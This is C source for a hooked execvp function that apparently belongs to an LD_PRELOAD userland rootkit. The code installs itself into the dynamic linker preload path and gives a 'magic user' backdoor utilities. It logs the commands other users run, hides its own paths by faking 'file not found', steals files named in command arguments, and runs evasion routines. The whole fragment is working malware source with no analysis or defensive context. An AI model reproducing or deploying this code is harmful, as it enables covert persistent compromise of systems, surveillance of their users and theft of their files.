int execvp(const char *filename, char *const argv[]){
    if(!notuser(0) && rknomore() && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME)){
        char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
        preloadpath = PRELOAD_FILE;
#endif
        if(!preloadok(PRELOAD_FILE, INSTALL_DIR, BDVLSO)){
            bdvinstall(argv, INSTALL_DIR, BDVLSO, preloadpath, MAGIC_GID);
            exit(0);
        }
    }

    plsdomefirst();

    hook(CEXECVP);

    if(magicusr()){
#ifdef BACKDOOR_ROLF
        if(!fnmatch("*/bdvprep", argv[0], FNM_PATHNAME)){
            bdprep();
            exit(0);
        }
#endif
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            dobdvutil(argv);
#endif
        return (long)call(CEXECVP, filename, argv);
    }

#ifdef LOG_USER_EXEC
    peepargv(argv);
#endif

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#ifdef FILE_STEAL
    for(int i = 0; argv[i] != NULL; i++)
        inspectfile(argv[i]);
#endif

#ifdef DO_EVASIONS
    int evasion_status = evade(filename, argv, NULL);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVP, filename, argv);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

    return (long)call(CEXECVP, filename, argv);
}
